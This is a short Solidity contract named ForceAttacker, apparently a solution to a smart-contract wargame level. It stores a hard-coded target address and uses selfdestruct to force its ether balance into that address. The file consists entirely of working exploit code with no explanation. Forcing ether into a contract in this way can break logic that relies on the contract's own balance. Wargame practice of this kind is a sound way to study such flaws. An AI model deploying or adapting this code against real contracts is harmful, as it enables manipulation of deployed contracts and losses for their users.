pragma solidity ^0.8.0;

contract ForceAttacker {
    address payable instance;

    constructor() payable {
        instance = payable(0xa16E02E87b7454126E5E10d957A927A7F5B5d2be);
    }

    receive() external payable {}

    function triggerSelfDestruct() external {
        selfdestruct(instance);
    }
}